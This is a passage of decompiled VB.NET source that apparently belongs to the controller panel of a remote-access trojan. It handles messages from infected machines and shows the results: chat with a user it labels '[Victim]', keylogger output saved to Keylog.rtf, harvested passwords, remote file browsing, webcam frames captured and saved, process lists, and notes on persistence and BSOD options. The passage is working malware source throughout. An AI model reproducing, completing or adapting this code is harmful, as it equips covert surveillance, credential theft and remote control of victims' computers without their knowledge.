                        client_0.osk = Class7.sk_0.GetClient(strArray1(1))
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        client_0.CN = False
                        ProjectData.ClearProjectError()
                    End Try
                End If
                If Class7.form1_0.InvokeRequired Then
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                Else
                    Dim chat1 As Chat = DirectCast(Class7.smethod_3("ch" & client_0.ip()), Chat)
                    Dim Left2 As String = strArray1(2)
                    If Operators.CompareString(Left2, "~", False) = 0 Then
                        If chat1 IsNot Nothing Then
                            Return
                        End If
                        Dim chat2 As New Chat()
                        chat2.Name = "ch" & client_0.ip()
                        chat2.sk = client_0
                        chat2.osk = client_0.osk
                        chat2.T2.Enabled = False
                        chat2.Button1.Enabled = False
                        DirectCast(chat2, Control).Show()
                    ElseIf Operators.CompareString(Left2, "!", False) = 0 Then
                        chat1.T2.Enabled = True
                        chat1.Button1.Enabled = True
                        Dim chat2 As Chat = chat1
                        Monitor.Enter(DirectCast(chat2, Object))
                        Try
                            chat1.T1.AppendText("Connected .." & vbCr & vbLf)
                        Finally
                            Monitor.[Exit](DirectCast(chat2, Object))
                        End Try
                    Else
                        If Operators.CompareString(Left2, "@", False) <> 0 Then
                            Return
                        End If
                        Dim chat2 As Chat = chat1
                        Monitor.Enter(DirectCast(chat2, Object))
                        Try
                            chat1.T1.SelectionStart = chat1.T1.TextLength
                            chat1.T1.SelectionFont = New Font(chat1.T1.Font, FontStyle.Bold)
                            chat1.T1.AppendText("[Victim] ")
                            chat1.T1.SelectionFont = chat1.T1.Font
                            chat1.T1.AppendText(Class6.smethod_16(strArray1(3)) & vbCr & vbLf)
                            chat1.T1.SelectionStart = chat1.T1.TextLength
                            chat1.T1.ScrollToCaret()
                            Try
                                Interaction.AppActivate(chat1.Text)
                            Catch ex As Exception
                                ProjectData.SetProjectError(ex)
                                ProjectData.ClearProjectError()
                            End Try
                        Finally
                            Monitor.[Exit](DirectCast(chat2, Object))
                        End Try
                    End If
                End If
            ElseIf Operators.CompareString(Left1, "kla", False) = 0 Then
                Dim kl1 As kl = DirectCast(Class7.smethod_3("kl" & client_0.ip()), kl)
                Dim kl2 As kl = kl1
                Monitor.Enter(DirectCast(kl2, Object))
                Try
                    kl1.T1.Clear()
                    Dim strArray2 As String() = Strings.Split(Class6.smethod_16(strArray1(1)), vbCr & vbLf, -1, CompareMethod.Binary)
                    kl1.ProgressBar1.Value = 0
                    kl1.ProgressBar1.Maximum = strArray2.Length
                    Dim strArray3 As String() = strArray2
                    Dim index As Integer = 0
                    While index < strArray3.Length
                        Dim T As String = strArray3(index)
                        kl1.insert(T)
                        Dim progressBar As ProgressBar = kl1.ProgressBar1
                        progressBar.Value = progressBar.Value + 1
                        index += 1

                    End While
                    kl1.T1.ScrollToCaret()
                    kl1.ProgressBar1.Value = 0
                    kl1.ToolStripMenuItem1.Enabled = True
                    If Not Directory.Exists(client_0.Folder) Then
                        Directory.CreateDirectory(client_0.Folder)
                    End If
                    kl1.T1.SaveFile(client_0.Folder + "Keylog.rtf")
                Finally
                    Monitor.[Exit](DirectCast(kl2, Object))
                End Try
            ElseIf Operators.CompareString(Left1, "kl", False) = 0 Then
                If Class7.form1_0.InvokeRequired Then
                    ' ISSUE: method pointer
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                Else
                    If Class7.smethod_3("kl" & client_0.ip()) Is Nothing Then
                        Dim kl As New kl()
                        kl.c = client_0
                        kl.Name = "kl" & client_0.ip()
                        kl.Text = Conversions.ToString(Class7.smethod_1(client_0.L))
                        DirectCast(kl, Control).Show()
                    End If
                    ' ISSUE: method pointer
                     Dim dzd As New Thread(New ParameterizedThreadStart(AddressOf Class7.smethod_5))
                    dzd.Start(New Object() {client_0, Class6.smethod_11(("kla" & Class7.string_1 & strArray1(1)))})
                End If
            ElseIf Operators.CompareString(Left1, "ret", False) = 0 Then
                If Class7.form1_0.InvokeRequired Then
                    ' ISSUE: method pointer
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                Else
                    If Operators.CompareString(strArray1(1), Class7.smethod_0("pw.dll", DirectCast(Nothing, String)).string_1, False) <> 0 Then
                        Return
                    End If
                    Dim pass1 As Pass = DirectCast(Class7.smethod_3("Pass"), Pass)
                    If pass1 Is Nothing Then
                        pass1 = New Pass()
                        DirectCast(pass1, Control).Show()
                    End If
                    Dim pass2 As Pass = pass1

                    Dim c As Client = client_0
                    Dim str As String = Class6.smethod_16(strArray1(2))
                    Dim S As String = str
                    pass2.XD(c, S)
                End If
            ElseIf Operators.CompareString(Left1, "inf", False) = 0 Then
                If client_0.L Is Nothing Then
                    Return
                End If
                Dim strArray2 As String() = Strings.Split(Class6.smethod_16(strArray1(1)), vbCr & vbLf, -1, CompareMethod.Binary)
                Dim format As String = "+++ Server Info"
                Dim num1 As Integer = 0
                Dim num2 As Integer = strArray2.Length - 1
                Dim index As Integer = num1
                While index <= num2
                    format = format & vbCr & vbLf & "{" & Conversions.ToString(index) & "}  " & strArray2(index)
                    index += 1

                End While
                client_0.L.Cells(0).ToolTipText = String.Format(format, DirectCast("Name", Object), DirectCast("Host", Object), DirectCast("Dir", Object), DirectCast("Exe", Object), DirectCast("Copy", Object), _
                    DirectCast("StartUP F", Object), DirectCast("StartUp R", Object), DirectCast("BSOD", Object))
            ElseIf Operators.CompareString(Left1, "FM", False) = 0 Then
                Dim manager As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager Is Nothing Then
                    Return
                End If
                Dim Left2 As String = strArray1(1)
                If Operators.CompareString(Left2, "!", False) = 0 Then
                    manager.L1.Items.Clear()
                    Dim num1 As Integer = 0
                    Dim list As New List(Of ListViewItem)()
                    Dim num2 As Integer = 2
                    Dim num3 As Integer = strArray1.Length - 1
                    Dim index As Integer = num2
                    While index <= num3
                        Dim strArray2 As String() = Strings.Split(Class6.smethod_16(strArray1(index)), "*", -1, CompareMethod.Binary)
                        Dim directoryInfo As New DirectoryInfo(strArray2(0))
                        Dim listViewItem As New ListViewItem(directoryInfo.Name)
                        listViewItem.ToolTipText = directoryInfo.FullName
                        listViewItem.SubItems.Add(strArray2(1))
                        Dim Left3 As String = strArray2(1)
                        If Operators.CompareString(Left3, DriveType.Fixed.ToString(), False) = 0 Then
                            listViewItem.ImageIndex = 1
                        ElseIf Operators.CompareString(Left3, DriveType.Removable.ToString(), False) = 0 Then
                            listViewItem.ImageIndex = 3
                        ElseIf Operators.CompareString(Left3, DriveType.CDRom.ToString(), False) = 0 Then
                            listViewItem.ImageIndex = 2
                        ElseIf Operators.CompareString(Left3, String.Empty, False) = 0 Then
                            listViewItem.ImageIndex = 0
                            Select Case num1
                                Case 0
                                    listViewItem.Text = "Desktop"
                                    Exit Select
                                Case 1
                                    listViewItem.Text = "MyPictures"
                                    Exit Select
                                Case 2
                                    listViewItem.Text = "UserProfile"
                                    Exit Select
                                Case 3
                                    listViewItem.Text = "StartUp"
                                    Exit Select
                            End Select
                            num1 += 1

                            listViewItem.SubItems(1).Text = "DIR"
                        Else
                            listViewItem.ImageIndex = If(Operators.CompareString(Left3, DriveType.Network.ToString(), False) <> 0, 1, 5)
                        End If
                        list.Add(listViewItem)
                        If list.Count > 10 Then
                            manager.L1.Items.AddRange(list.ToArray())
                            list.Clear()
                        End If
                        index += 1

                    End While
                    If list.Count > 0 Then
                        manager.L1.Items.AddRange(list.ToArray())
                        list.Clear()
                    End If
                    manager.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                ElseIf Operators.CompareString(Left2, "@", False) = 0 Then
                    Dim stripProgressBar1 As ToolStripProgressBar = manager.pr
                    Monitor.Enter(DirectCast(stripProgressBar1, Object))
                    Try
                        If manager.Cache.Contains(Class6.smethod_16(strArray1(2))) Then
                            manager.Cache.Remove(Class6.smethod_16(strArray1(2)))
                        End If
                        Dim gclass14 As New Manager.GClass14()
                        gclass14.string_0 = Class6.smethod_16(strArray1(2))
                        manager.Cache.Add(DirectCast(gclass14, Object), gclass14.string_0, DirectCast(Nothing, Object), DirectCast(Nothing, Object))
                        Dim directoryInfo As New DirectoryInfo(Class6.smethod_16(strArray1(2)))
                        If Operators.CompareString(manager.TextBox1.Text, directoryInfo.FullName, False) <> 0 Then
                            gclass14.list_1.Clear()
                            gclass14.list_0.Clear()
                            Try
                                manager.Cache.Remove(Class6.smethod_16(strArray1(2)))
                            Catch ex As Exception
                                ProjectData.SetProjectError(ex)
                                ProjectData.ClearProjectError()
                            End Try
                        Else
                            manager.pr.Value = 0
                            Dim strArray2 As String() = Strings.Split(strArray1(3), "*", -1, CompareMethod.Binary)
                            manager.pr.Maximum = strArray2.Length - 1
                            manager.L2.Items.Clear()
                            If directoryInfo.Parent IsNot Nothing Then
                                Dim listViewItem As ListViewItem = manager.L2.Items.Add("..", "..", 0)
                                listViewItem.ToolTipText = directoryInfo.Parent.FullName
                                listViewItem.SubItems.Add(String.Empty)
                                listViewItem.SubItems.Add("DIR")
                            End If
                            manager.vmethod_108().Images.Clear()
                            manager.vmethod_108().Images.Add(manager.MG.Images(0))
                            manager.vmethod_108().Images.Add("*", manager.MG.Images(4))
                            Dim list As New List(Of ListViewItem)()
                            Dim num1 As Integer = 0
                            Dim num2 As Integer = strArray2.Length - 2
                            Dim index As Integer = num1
                            While index <= num2
                                If Operators.CompareString(manager.TextBox1.Text, directoryInfo.FullName, False) = 0 Then
                                    Dim listViewItem1 As New ListViewItem(Class6.smethod_16(strArray2(index)), 0)
                                    Dim listViewItem2 As ListViewItem = listViewItem1
                                    listViewItem2.SubItems.Add(String.Empty)
                                    listViewItem2.SubItems.Add("DIR")
                                    listViewItem2.ToolTipText = directoryInfo.FullName & listViewItem2.Text
                                    gclass14.list_0.Add(listViewItem2.ToolTipText)
                                    Dim stripProgressBar2 As ToolStripProgressBar = manager.pr
                                    stripProgressBar2.Value = stripProgressBar2.Value + 1
                                    list.Add(listViewItem1)
                                    If list.Count > 20 Then
                                        manager.L2.Items.AddRange(list.ToArray())
                                        list.Clear()
                                    End If
                                    index += 1

                                Else
                                    gclass14.list_1.Clear()
                                    gclass14.list_0.Clear()
                                    Try
                                        manager.Cache.Remove(Class6.smethod_16(strArray1(2)))
                                        Return
                                    Catch ex As Exception
                                        ProjectData.SetProjectError(ex)
                                        ProjectData.ClearProjectError()
                                        Return
                                    End Try
                                End If
                            End While
                            If list.Count > 0 Then
                                manager.L2.Items.AddRange(list.ToArray())
                                list.Clear()
                            End If
                            manager.TextBox1.BackColor = Color.Gainsboro
                            manager.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            client_0.Send("Ex" & Class7.string_1 & "fm" & Class7.string_1 & "@" & Class7.string_1 & strArray1(2))
                            manager.pr.Value = 0
                        End If
                    Finally
                        Monitor.[Exit](DirectCast(stripProgressBar1, Object))
                    End Try
                ElseIf Operators.CompareString(Left2, "#", False) = 0 Then
                    Dim stripProgressBar1 As ToolStripProgressBar = manager.pr
                    Monitor.Enter(DirectCast(stripProgressBar1, Object))
                    Try
                        Dim Right As String = Class6.smethod_16(strArray1(2))
                        If Operators.CompareString(manager.TextBox1.Text, Right, False) <> 0 Then
                            Return
                        End If
                        Dim gclass14 As Manager.GClass14 = DirectCast(manager.Cache(Class6.smethod_16(strArray1(2))), Manager.GClass14)
                        gclass14.list_1.Clear()
                        manager.pr.Value = 0
                        Dim strArray2 As String() = Strings.Split(strArray1(3), "*", -1, CompareMethod.Binary)
                        manager.pr.Maximum = strArray2.Length - 1
                        Dim list As New List(Of ListViewItem)()
                        Dim num1 As Integer = 0
                        Dim num2 As Integer = strArray2.Length - 2
                        Dim index As Integer = num1
                        While index <= num2
                            Dim strArray3 As String() = Strings.Split(Class6.smethod_16(strArray2(index)), "*", -1, CompareMethod.Binary)
                            If Operators.CompareString(manager.TextBox1.Text, Right, False) = 0 Then
                                Dim listViewItem1 As New ListViewItem(strArray3(0))
                                Dim listViewItem2 As ListViewItem = listViewItem1
                                Dim fileInfo As New FileInfo(Right & strArray3(0))
                                listViewItem2.ToolTipText = fileInfo.FullName
                                listViewItem2.SubItems.Add(Class6.smethod_17(Conversions.ToLong(strArray3(1))))
                                listViewItem2.Name = listViewItem2.ToolTipText
                                If strArray3.Length = 2 Then
                                    If Operators.CompareString(fileInfo.Extension, String.Empty, False) = 0 Then
                                        listViewItem2.SubItems.Add(String.Empty)
                                        listViewItem2.ImageKey = "*"
                                    Else
                                        listViewItem2.SubItems.Add(fileInfo.Extension.Replace(".", String.Empty))
                                        If Not manager.vmethod_108().Images.ContainsKey(fileInfo.Extension) Then
                                            File.Create(Application.StartupPath & "\!" & fileInfo.Extension).Close()
                                            manager.vmethod_108().Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath & "\!" & fileInfo.Extension))
                                            File.Delete(Application.StartupPath & "\!" & fileInfo.Extension)
                                            listViewItem2.ImageKey = fileInfo.Extension
                                        Else
                                            listViewItem2.ImageKey = fileInfo.Extension
                                        End If
                                    End If
                                Else
                                    listViewItem2.SubItems.Add(fileInfo.Extension.Remove(0, 1))
                                    If Not manager.vmethod_108().Images.ContainsKey(listViewItem2.ToolTipText) Then
                                        manager.vmethod_108().Images.Add(listViewItem2.ToolTipText, Image.FromStream(DirectCast(New MemoryStream(Convert.FromBase64String(strArray3(2))), Stream)))
                                    End If
                                    If Not manager.Images.Contains("!" & listViewItem2.ToolTipText) Then
                                        manager.Images.Add(DirectCast(manager.vmethod_108().Images(listViewItem2.ToolTipText), Object), "!" & listViewItem2.ToolTipText, DirectCast(Nothing, Object), DirectCast(Nothing, Object))
                                    End If
                                    listViewItem2.ImageKey = listViewItem2.ToolTipText
                                End If
                                gclass14.list_1.Add(listViewItem2.ToolTipText & "*" & listViewItem2.SubItems(1).Text & "*" & listViewItem2.SubItems(2).Text)
                                Dim stripProgressBar2 As ToolStripProgressBar = manager.pr
                                stripProgressBar2.Value = stripProgressBar2.Value + 1
                                list.Add(listViewItem1)
                                If list.Count > 20 Then
                                    manager.L2.Items.AddRange(list.ToArray())
                                    list.Clear()
                                End If
                                index += 1

                            Else
                                gclass14.list_1.Clear()
                                gclass14.list_0.Clear()
                                Try
                                    manager.Cache.Remove(Class6.smethod_16(strArray1(2)))
                                    Return
                                Catch ex As Exception
                                    ProjectData.SetProjectError(ex)
                                    ProjectData.ClearProjectError()
                                    Return
                                End Try
                            End If
                        End While
                        If list.Count > 0 Then
                            manager.L2.Items.AddRange(list.ToArray())
                            list.Clear()
                        End If
                        manager.TextBox1.BackColor = Color.WhiteSmoke
                        manager.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        manager.pr.Value = 0
                    Finally
                        Monitor.[Exit](DirectCast(stripProgressBar1, Object))
                    End Try
                ElseIf Operators.CompareString(Left2, "$", False) = 0 Then
                    If manager.Images.Contains(Class6.smethod_16(strArray1(2))) Then
                        manager.Images.Remove(Class6.smethod_16(strArray1(2)))
                    End If
                    manager.Images.Add(DirectCast(Image.FromStream(DirectCast(New MemoryStream(DirectCast(NewLateBinding.LateIndexGet(DirectCast(Class6.smethod_9(byte_0_1, strArray1(2) & Class7.string_1), Object), New Object(0) {DirectCast(1, Object)}, DirectCast(Nothing, String())), Byte())), Stream)), Object), Class6.smethod_16(strArray1(2)), DirectCast(Nothing, Object), DirectCast(Nothing, Object))
                    If Not manager.L2.Items.ContainsKey(Class6.smethod_16(strArray1(2))) OrElse Not manager.L2.Items(Class6.smethod_16(strArray1(2))).Selected Then
                        Return
                    End If
                    manager.p.Image = DirectCast(manager.Images(Class6.smethod_16(strArray1(2))), Image)
                    manager.p.Visible = True
                ElseIf Operators.CompareString(Left2, "%", False) = 0 Then
                    If Class7.form1_0.InvokeRequired Then
                        ' ISSUE: method pointer
                        Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                    Else
                        Dim note As New Note()
                        note.FN = Class6.smethod_16(strArray1(2))
                        note.Text = manager.Text + " - " + note.FN
                        note.SK = manager.sk
                        note.TextBox1.Text = Class6.smethod_16(strArray1(3)).Replace(vbNullChar, String.Empty)
                        DirectCast(note, Control).Show()
                        note.ToolStripMenuItem1.Enabled = False
                    End If
                ElseIf Operators.CompareString(Left2, "dl", False) = 0 Then
                    Dim strArray2 As String() = Strings.Split(Class6.smethod_16(strArray1(2)), "*", -1, CompareMethod.Binary)
                    Try
                        For Each listViewItem12 As ListViewItem In manager.L2.Items
                            If Operators.CompareString(strArray2(1), "!", False) = 0 Then
                                If Operators.CompareString(listViewItem12.Text, New DirectoryInfo(strArray2(0)).Name, False) = 0 And Operators.CompareString(listViewItem12.SubItems(2).Text, "DIR", False) = 0 Then
                                    listViewItem12.Remove()
                                    Exit For
                                End If
                            ElseIf Operators.CompareString(listViewItem12.Text, New DirectoryInfo(strArray2(0)).Name, False) = 0 And Operators.CompareString(listViewItem12.SubItems(2).Text, "DIR", False) <> 0 Then
                                listViewItem12.Remove()
                                Exit For
                            End If
                        Next
                    Finally
                        Dim enumerator As IEnumerator
                        If TypeOf enumerator Is IDisposable Then
                            TryCast(enumerator, IDisposable).Dispose()
                        End If
                    End Try
                ElseIf Operators.CompareString(Left2, "nm", False) = 0 Then
                    Dim strArray2 As String() = Strings.Split(Class6.smethod_16(strArray1(2)), "*", -1, CompareMethod.Binary)
                    Try
                        For Each listViewItem As ListViewItem In manager.L2.Items
                            If Operators.CompareString(listViewItem.ToolTipText, strArray2(0), False) = 0 Then
                                If Operators.CompareString(strArray2(2), "*", False) = 0 Then
                                    Dim directoryInfo As New DirectoryInfo(strArray2(0))
                                    listViewItem.Text = strArray2(1)
                                    listViewItem.ToolTipText = directoryInfo.Parent.FullName & "\" & listViewItem.Text
                                Else
                                    Dim fileInfo As New FileInfo(strArray2(0))
                                    listViewItem.Text = strArray2(1)
                                    listViewItem.ToolTipText = fileInfo.Directory.FullName & "\" & listViewItem.Text
                                    listViewItem.SubItems(2).Text = New FileInfo(listViewItem.ToolTipText).Extension.Replace(".", String.Empty)
                                End If
                            End If
                        Next
                    Finally
                        Dim enumerator As IEnumerator
                        If TypeOf enumerator Is IDisposable Then
                            TryCast(enumerator, IDisposable).Dispose()
                        End If
                    End Try
                Else
                    If Operators.CompareString(Left2, "ER", False) <> 0 Then
                        Return
                    End If
                    manager.SL.Text = strArray1(3)
                    If Not strArray1(3).StartsWith("UnRAR_") Then
                        Return
                    End If
                    Dim stripProgressBar As ToolStripProgressBar = manager.pr
                    Monitor.Enter(DirectCast(stripProgressBar, Object))
                    Try
                        Dim fileInfo As New FileInfo(strArray1(3))
                        If Operators.CompareString(fileInfo.Directory.FullName.ToLower() & "\", manager.TextBox1.Text.ToLower(), False) <> 0 Then
                            Return
                        End If
                        Dim listViewItem As ListViewItem = manager.L2.Items.Add(fileInfo.FullName, fileInfo.Name, 0)
                        listViewItem.SubItems.Add(String.Empty)
                        listViewItem.SubItems.Add("DIR")
                    Finally
                        Monitor.[Exit](DirectCast(stripProgressBar, Object))
                    End Try
                End If
            ElseIf Operators.CompareString(Left1, "CAM", False) = 0 Then
                If client_0.osk Is Nothing Then
                    client_0.isPL = True
                    Try
                        client_0.osk = Class7.sk_0.GetClient(strArray1(1))
                    Catch ex As Exception
                        ProjectData.SetProjectError(ex)
                        client_0.CN = False
                        ProjectData.ClearProjectError()
                    End Try
                End If
                Dim cam1 As Cam = DirectCast(Class7.smethod_3("cam" & client_0.ip()), Cam)
                Dim Left2 As String = strArray1(2)
                If Operators.CompareString(Left2, "~", False) = 0 Then
                    If cam1 Is Nothing Then
                        If Class7.form1_0.InvokeRequired Then
                            ' ISSUE: method pointer
                            Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                        Else
                            Dim cam2 As New Cam()
                            cam2.sk = client_0
                            cam2.osk = client_0.osk
                            cam2.Name = "cam" & client_0.ip()
                            Dim num1 As Integer = 3
                            Dim num2 As Integer = strArray1.Length - 1
                            Dim index As Integer = num1
                            While index <= num2
                                cam2.ComboBox1.SelectedIndex = cam2.ComboBox1.Items.Add(DirectCast(strArray1(index), Object))
                                index += 1

                            End While
                            DirectCast(cam2, Control).Show()
                        End If
                    Else
                        Dim num1 As Integer = 3
                        Dim num2 As Integer = strArray1.Length - 1
                        Dim index As Integer = num1
                        While index <= num2
                            cam1.ComboBox1.SelectedIndex = cam1.ComboBox1.Items.Add(DirectCast(strArray1(index), Object))
                            index += 1

                        End While
                    End If
                ElseIf Operators.CompareString(Left2, "!", False) = 0 Then
                    If cam1 Is Nothing Then
                        Return
                    End If
                    Dim cam2 As Cam = cam1
                    cam2.fps = cam2.fps + 1
                    cam1.pkt = byte_0_1.Length
                    Thread.Sleep(10)
                    If strArray1(3).Length = 1 Then
                        Return
                    End If
                    Dim image__2 As Image = Image.FromStream(DirectCast(New MemoryStream(DirectCast(NewLateBinding.LateIndexGet(DirectCast(Class6.smethod_9(byte_0_1, strArray1(2) & Class7.string_1), Object), New Object(0) {DirectCast(1, Object)}, DirectCast(Nothing, String())), Byte())), Stream))
                    If cam1.CheckBox3().Checked Then
                        Try
                            image__2.Save(cam1.folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg")
                        Catch ex As Exception
                            ProjectData.SetProjectError(ex)
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    cam1.PictureBox1().Image = image__2
                Else
                    If Operators.CompareString(Left2, "@", False) <> 0 OrElse cam1 Is Nothing Then
                        Return
                    End If
                    cam1.Button1().Text = "Start"
                End If
            ElseIf Operators.CompareString(Left1, "proc", False) = 0 Then
                Dim manager1 As Manager = DirectCast(Class7.smethod_3("m" & client_0.ip()), Manager)
                If manager1 Is Nothing Then
                    Return
                End If
                Dim stripProgressBar1 As ToolStripProgressBar = manager1.pr
                Monitor.Enter(DirectCast(stripProgressBar1, Object))
                Try
                    Dim Left2 As String = strArray1(1)
                    If Operators.CompareString(Left2, "pid", False) = 0 Then
                        manager1.PID = Conversions.ToInteger(strArray1(2))
                    ElseIf Operators.CompareString(Left2, "!", False) = 0 Then
                        Dim manager2 As Manager = manager1
                        Monitor.Enter(DirectCast(manager2, Object))
                        Try
                            Dim strArray2 As String() = Strings.Split(strArray1(2), "[::]", -1, CompareMethod.Binary)
                            Dim flag As Boolean
                            If Not (InlineAssignHelper(flag, manager1.LPR.Items.Count = 0)) Then
                                Try
                                    For Each listViewItem As ListViewItem In manager1.LPR.Items
                                        If listViewItem.ForeColor = Color.GreenYellow Then
                                            Try
                                                For Each listViewSubItem As ListViewItem.ListViewSubItem In listViewItem.SubItems
                                                    listViewSubItem.ForeColor = manager1.LPR.ForeColor
                                                Next
                                            Finally
                                                Dim enumerator As IEnumerator
                                                If TypeOf enumerator Is IDisposable Then
                                                    TryCast(enumerator, IDisposable).Dispose()
                                                End If
                                            End Try
                                        End If
                                    Next
                                Finally
                                    Dim enumerator As IEnumerator
                                    If TypeOf enumerator Is IDisposable Then
                                        TryCast(enumerator, IDisposable).Dispose()
                                    End If
                                End Try
                            End If
                            If strArray2.Length > 1 Then
                                manager1.pr.Value = 0
                                manager1.pr.Maximum = strArray2.Length
                                Dim list As New List(Of ListViewItem)()
                                Dim strArray3 As String() = strArray2
                                Dim index As Integer = 0
                                While index < strArray3.Length
                                    Dim str As String = strArray3(index)
                                    Dim strArray4 As String() = Strings.Split(str, "[:]", -1, CompareMethod.Binary)
                                    If Operators.CompareString(str, String.Empty, False) <> 0 Then
                                        If strArray4(2).StartsWith("\??\") Then
                                            strArray4(2) = strArray4(2).Remove(0, "\??\".Length)
                                        End If
                                        Try
                                            Dim stripProgressBar2 As ToolStripProgressBar = manager1.pr
                                            stripProgressBar2.Value = stripProgressBar2.Value + 1
                                        Catch ex As Exception
                                            ProjectData.SetProjectError(ex)
                                            ProjectData.ClearProjectError()
                                        End Try
                                        Dim listViewItem As New ListViewItem(strArray4(0))
                                        listViewItem.SubItems.Add(strArray4(1))
                                        listViewItem.Name = strArray4(1)
                                        If strArray4(2).Contains(":\") Then
                                            listViewItem.SubItems.Add(New FileInfo(strArray4(2).Replace("""", String.Empty)).Directory.Name)
                                            listViewItem.ToolTipText = strArray4(2).Replace("""", String.Empty)
                                        Else
                                            listViewItem.SubItems.Add(String.Empty)
                                        End If
                                        Dim String2 As String = " "
                                        listViewItem.SubItems.Add(strArray4(3))
                                        If strArray4(4).StartsWith("""") Then
                                            String2 = """"
                                            strArray4(4) = strArray4(4).Remove(0, 1)
                                        End If
                                        If strArray4(4).Contains(String2) Then
                                            strArray4(4) = strArray4(4).Remove(0, Strings.InStr(strArray4(4), String2, CompareMethod.Binary))
                                            If strArray4(4).StartsWith(" ") Then
                                                strArray4(4) = strArray4(4).Remove(0, 1)
                                            End If
                                            listViewItem.SubItems.Add(strArray4(4))
                                        Else
                                            listViewItem.SubItems.Add(String.Empty)
                                        End If
                                        If Not flag Then
                                            listViewItem.ForeColor = Color.GreenYellow
                                        End If
                                        If Conversions.ToInteger(strArray4(1)) = manager1.PID Then
                                            listViewItem.ForeColor = Color.Red
                                        End If
                                        list.Add(listViewItem)
                                        If list.Count > 10 Then
                                            manager1.LPR.Items.AddRange(list.ToArray())
                                            list.Clear()
                                        End If
                                        index += 1

                                    Else
                                        Exit While
                                    End If
                                End While
                                If list.Count > 0 Then
                                    manager1.LPR.Items.AddRange(list.ToArray())
                                    list.Clear()
                                End If
                                If manager1.PRFX Then
                                    manager1.PRFX = False
                                    manager1.LPR.method_3()
                                End If
                                Dim columnHeader As ColumnHeader = manager1.LPR.columnHeader_0
                                If columnHeader Is Nothing Then
                                    manager1.LPR.GClass9_ColumnClick(DirectCast(manager1.LPR, Object), New ColumnClickEventArgs(0))
                                Else
                                    columnHeader.Tag = If(Not Operators.ConditionalCompareObjectEqual(columnHeader.Tag, DirectCast("+", Object), False), (If(Not Operators.ConditionalCompareObjectEqual(columnHeader.Tag, DirectCast("-", Object), False), DirectCast("-", Object), DirectCast("+", Object))), DirectCast("-", Object))
                                    manager1.LPR.GClass9_ColumnClick(DirectCast(manager1.LPR, Object), New ColumnClickEventArgs(columnHeader.Index))
                                End If
                            End If
                            manager1.PRNXT = True
                        Finally
                            Monitor.[Exit](DirectCast(manager2, Object))
                        End Try
                    ElseIf Operators.CompareString(Left2, "RM", False) = 0 Then
                        Dim num1 As Integer = 2
                        Dim num2 As Integer = strArray1.Length - 1
                        Dim index As Integer = num1
                        While index <= num2
                            manager1.LPR.Items.RemoveByKey(strArray1(index))
                            index += 1

                        End While
                    Else
                        If Operators.CompareString(Left2, "ER", False) <> 0 Then
                            Return
                        End If
                        manager1.SL.Text = strArray1(2)
                    End If
                Finally
                    Monitor.[Exit](DirectCast(stripProgressBar1, Object))
                End Try
            Else
                If Operators.CompareString(Left1, "lv", False) <> 0 Then
                    If Operators.CompareString(Left1, "ll", False) <> 0 Then
                        If Operators.CompareString(Left1, "P", False) = 0 Then
                            If client_0.L Is Nothing OrElse client_0.L.Cells.Count <= Class7.int_10 Then
                                Return
                            End If
                            Dim collection As Collection = Class7.form1_0.S.Online
                            Monitor.Enter(DirectCast(collection, Object))
                            Try
                                Dim dataGridViewCell As DataGridViewCell = client_0.L.Cells(Class7.int_10)
                                Dim num As Integer = Conversions.ToInteger(strArray1(1))
                                dataGridViewCell.Style.ForeColor = If(num <> 999, (If(num < 500, (If(num < 250, Color.LimeGreen, Color.LightGreen)), Color.GreenYellow)), Color.Orange)
                                client_0.L.Cells(Class7.int_10).Value = DirectCast(strArray1(1) & "ms", Object)
                                Return
                            Finally
                                Monitor.[Exit](DirectCast(collection, Object))
                            End Try
                        ElseIf Operators.CompareString(Left1, "bla", False) = 0 Then
                            client_0.L.DefaultCellStyle.ForeColor = Class7.form1_0.L1.DefaultCellStyle.ForeColor
                            Return
                        ElseIf Operators.CompareString(Left1, "~", False) = 0 Then
                            client_0.Send("~")
                            Return
                        ElseIf Operators.CompareString(Left1, "MSG", False) = 0 Then
                            If Not Class7.class8_0.bool_5 Then
                                Return
                            End If
                            Class7.form1_0.Pp1.WRT(New Object(11) {DirectCast(Color.LightSteelBlue, Object), DirectCast(Class6.smethod_13(), Object), DirectCast(Color.DarkSlateBlue, Object), DirectCast(client_0.COI, Object), DirectCast(client_0.ip(), Object), DirectCast(Color.SteelBlue, Object), _
                                RuntimeHelpers.GetObjectValue(Class7.smethod_1(client_0.L)), DirectCast(vbCr & vbLf, Object), DirectCast(Color.Purple, Object), DirectCast("-->", Object), DirectCast(Color.White, Object), DirectCast(strArray1(1), Object)})
                            Return
                        ElseIf Operators.CompareString(Left1, "ER", False) = 0 Then
                            If Not Class7.class8_0.bool_4 Then
                                Return
                            End If
                            Class7.form1_0.Pp1.WRT(New Object(11) {DirectCast(Color.LightSteelBlue, Object), DirectCast(Class6.smethod_13(), Object), DirectCast(Color.DarkSlateBlue, Object), DirectCast(client_0.COI, Object), DirectCast(client_0.ip(), Object), DirectCast(Color.SteelBlue, Object), _
                                RuntimeHelpers.GetObjectValue(Class7.smethod_1(client_0.L)), DirectCast(vbCr & vbLf, Object), DirectCast(Color.Purple, Object), DirectCast("-->", Object), DirectCast(Color.White, Object), DirectCast(strArray1(1) & " " & strArray1(2), Object)})
                            Return
                        ElseIf Operators.CompareString(Left1, "pl", False) = 0 Then
                            Try
                                client_0.plg.Remove(strArray1(1))
                            Catch ex As Exception
                                ProjectData.SetProjectError(ex)
                                ProjectData.ClearProjectError()
                            End Try
